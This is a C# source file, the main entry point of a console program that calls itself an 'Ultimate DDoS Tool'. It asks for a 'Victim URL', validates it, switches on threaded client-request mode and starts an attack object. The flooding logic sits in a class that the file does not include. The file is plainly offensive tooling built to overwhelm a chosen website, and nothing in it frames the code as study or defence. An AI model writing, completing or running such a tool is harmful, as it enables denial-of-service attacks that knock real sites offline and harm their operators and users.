using crasher.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace crasher
{
    class Program
    {
        static void Main(string[] args)
        {
            String url;
            int type;
            Console.WriteLine("Ultimate DDoS Tool by Luca Di Bello");


            while (true)
            {
                Console.Write("Victim URL: ");
                url = Console.ReadLine();

                if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
                {
                    break;
                }
                else { url = ""; }
            }

            Console.WriteLine();
            
            /*
            while (true)
            {
                Console.Write("Attacks types (1-Client  2-Mirror): ");
                type = Convert.ToInt32(Console.ReadLine());
                break;
            }
            */

            AttackSettings.Url = url;
            AttackSettings.Mode = AttackType.ClientRequest;
            AttackSettings.Threading = true;
            Attack a = new Attack(url, AttackType.ClientRequest);
            a.Start();

            Console.ReadKey();
        }
    }
}
